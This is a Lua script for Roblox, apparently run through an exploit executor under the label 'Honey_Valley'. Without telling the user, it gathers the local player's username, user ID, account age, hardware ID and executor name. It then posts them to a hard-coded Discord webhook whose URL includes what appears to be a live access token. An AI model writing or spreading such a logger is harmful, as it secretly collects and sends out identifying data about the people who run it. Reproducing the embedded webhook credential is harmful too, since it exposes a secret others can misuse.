if _G.Honey_Valley then
  warn("Script Is fucking Already running",0) 
    return
end

_G.Honey_Valley = true
local https = cloneref(game:GetService("HttpService")) 
local HttpService = cloneref(game:GetService("HttpService")) 
local MarketplaceService = game:GetService("MarketplaceService")
local hookURL = "https://discord.com/api/webhooks/1318961945424166973/TBy_bcaVzjkMko3QO4WYK4gRMPlyMReyFn7Tt9jB9ZSObcVCaGnAzCrp8RjQinFbqdjY"

-- Function to get player's avatar (thumbnail) using a different method
function thumbnail(plyId)
    local url = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. plyId .. "&returnPolicy=PlaceHolder&size=75x75&format=Png&isCircular=false"
    local response = http_request({
        Url = url,
        Method = "GET",
        Headers = {
            ["Content-Type"] = "application/json"
        }
    })

    local data = game:GetService("HttpService"):JSONDecode(response.Body)
    return data["data"][1]["imageUrl"]
end

-- You can call the script manually or in another way if you want to post data for the local player
local player = game.Players.LocalPlayer
local userid = player.UserId
local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local identifyexecutor = identifyexecutor()
-- Function to identify the executor (Fluxus, Synapse, etc.)

local data = {
    embeds = {
        {
            color = 14177041, -- Red color in decimal format
            title = "Player Information",  -- Adjusted title
            description = "Information about the local player.", -- General description
            thumbnail = {
                url = thumbnail(player.UserId)  -- Add player's avatar thumbnail
            },
            fields = {
                {
                    ["name"] = "Game Name",
                    ["value"] = gameInfo.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Place ID",
                    ["value"] = tostring(game.PlaceId),
                    ["inline"] = true
                },
                {
                    ["name"] = "Username",
                    ["value"] = player.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = player.DisplayName,
                    ["inline"] = true
                },
                {
                    ["name"] = "User ID",
                    ["value"] = tostring(player.UserId),
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = tostring(player.AccountAge) .. " days",
                    ["inline"] = true
                },
                {
                    ["name"] = "Hardware ID",
                    ["value"] = HWID,
                    ["inline"] = false
                },
                {
                    ["name"] = "Executor",
                    ["value"] = identifyexecutor,
                    ["inline"] = true
                }
            },
            footer = {
                ["text"] = "Information sent via script"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")  -- ISO timestamp
        }
    }
}

local success, errorMessage = pcall(function()
    http_request({
        Url = hookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(data)
    })
end)

if not success then
    warn("Failed to send data to the webhook: " .. errorMessage)
end
